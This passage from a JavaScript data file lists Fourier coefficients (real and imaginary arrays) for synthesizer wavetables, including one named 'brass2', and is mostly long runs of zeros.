0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ],  imag: [ 0, -.499999, .077463, .070331, .132072, .012785, .003997, .02055, -.010545, -.008137, -.000311, -.013317, -.004685, -.00145, -.006016, -.004443, .0041, -.007229, .002437, -.002378, -.000323, -.000455, .000476, -.000748, .000378, -.000138, .000087, -.000111, .000144, -.00017, -.000052, -.000136, -.000061, -.000182, -.000043, -.000061, -.000048, -.000021, .000033, -.000047, .00005, .000033, -.00001, .00001, .000043, -.000003, .000024, .000028, .00001, .000026, .000003, -.000008, -.000005, .000019, -.000006, -.000004, .000007, .000017, 0, .000007, 0, .00001, .000011, .00001, .000002, .000009, .000007, .000009, -.000001, .000013, -.000001, -.000001, .000005, .000009, .000008, .000005, .000006, .000011, .000004, .000001, -.000008, .000008, .000006, .000002, -.000003, .000004, -.000011, .000004, -.000005, .000008, -.000002, .000003, -.000008, -.000001, .000001, -.000008, .000003, .000001, .000005, .000005, -.000002, -.000003, -.000008, -.000002, .000003, .000005, .000007, -.000005, .000004, .000009, -.000011, .000008, -.000006, .000003, .000004, -.000001, -.000002, -.000001, .000007, -.000002, .000012, -.000006, .000005, -.000001, -.000001, .000002, -.000003, .000012, -.000003, .000008, -.000002, .000002, .000009, -.000003, .000008, .000001, .000007, .000005, -.000004, -.000002, -.000004, -.000001, .000001, .000003, .000008, -.000007, 0, -.000002, -.000003, -.000002, .000002, .000004, 0, .000006, 0, -.000001, -.000006, .000001, -.00001, .000003, -.000003, .000005, -.000002, .000007, -.000005, .000009, .000005, .000001, .000002, .000007, .000001, -.000006, .000005, .000001, .000012, .000003, -.000001, -.000001, .000017, .000005, -.000002, .000001, -.000001, -.000005, -.000003, -.000001, .000002, -.000001, -.000011, -.000002, -.000005, -.000004, -.000004, -.000001, .000008, -.000001, .000002, 0, -.000002, .000004, .000007, .000004, -.000009, .000001, .000001, -.000007, -.000008, -.000002, 0, .000008, -.000015, .000002, .000003, .000007, -.000006, .000003, .000007, 0, -.000001, .000002, .000002, .000005, 0, -.000001, .000002, -.000008, -.000003, .000001, .000002, -.000009, -.000006, -.000017, -.000001, .000008, -.000002, -.000002, -.000004, -.000017, -.000001, -.000005, -.000009, .000001, -.000005, .000007, -.000003, -.000012, -.000003, -.000012, .000001, .000007, -.000014, -.000007, 0, -.000003, -.000001, .000002, .000001, 0, .000005, .000006, .000006, .000005, -.000001, -.000009, .000004, -.000003, .000006, -.000005, -.00001, 0, .000001, -.000001, .000007, -.000006, -.000011, .000003, .000005, .000003, -.000006, .00001, -.000012, -.000007, 0, -.000012, -.000004, .000002, -.00001, 0, -.000004, -.000001, -.000014, -.000002, -.000017, -.000013, -.000019, -.000008, -.000015, -.000022, -.000016, -.000024, -.000026, -.00002, -.000024, -.000024, -.000023, -.000017, -.000019, -.000017, -.000017, -.000013, -.000012, -.00001, -.000009, -.000007, -.000006, -.000005, -.000004, -.000003, -.000003, -.000002, -.000002, -.000002, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ] } ],
	[ "brass2",      { real: [ 0, .171738, .131907, -.1948, -.129913, -.081043, .049213, .027828, -.008357, -.005044, .002145, .000773, -.001392, -.000916, -.000012, .000323, -.000003, .000127, -.000135, -.000029, -.000031, .000087, -.000091, .000005, -.000026, .000027, -.000062, -.000017, -.000002, .000002, .000012, -.000024, .000011, -.000011, -.000001, 0, .000003, .000006, -.000009, -.000002, .000001, .000007, .000014, -.000008, -.000001, -.000003, -.000011, -.000003, .000004, -.000002, -.000004, .000001, -.000004, .000001, .000003, .000001, .000002, .000003, -.000001, -.000005, 0, .000001, -.000008, .000001, .000003, -.000004, -.000004, -.000002, .000003, 0, -.000002, -.000009, .000009, .000024, .000011, -.000017, -.000024, -.000002, 0, .000002, .000015, .000022, .000001, -.000022, -.000016, .000001, .000002, -.000003, -.000002, .000001, -.000001, .000005, .000001, -.000001, -.000001, 0, -.000001, -.000003, -.000001, -.000002, .000001, -.000003, -.000002, .000004, .000007, -.000002, -.000006, -.000009, -.000003, -.000001, .000001, 0, .000006, 0, -.000009, -.000011, .000003, .000005, -.000002, -.000002, -.000001, .000001, .000001, 0, -.000001, -.000001, .000001, 0, -.000001, .000002, .000001, 0, 0, 0, -.000001, 0, 0, -.000002, -.000001, 0, 0, 0, .000001, .000001, -.000001, -.000001, -.000002, .000001, .000002, -.000001, -.000004, 0, .000004, .000005, .000001, 0, -.000002, 0, -.000004, .000001, .000004, .000007, 0, -.000004, 0, .000002, .000001, -.000001, .000001, 0, 0, -.000001, 0, -.000002, .000001, .000004, 0, -.000007, .000002, .00003, .000007, -.000035, .000007, .000111, .000036, -.000022, -.000053, 0, .000001, -.000004, .000035, .000082, .00004, -.000032, -.000062, -.000012, .000012, -.000008, -.000006, .000004, .000006, .000003, .000001, 0, .000001, 0, 0, -.000001, -.000001, -.000001, -.000001, -.000002, -.000002, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 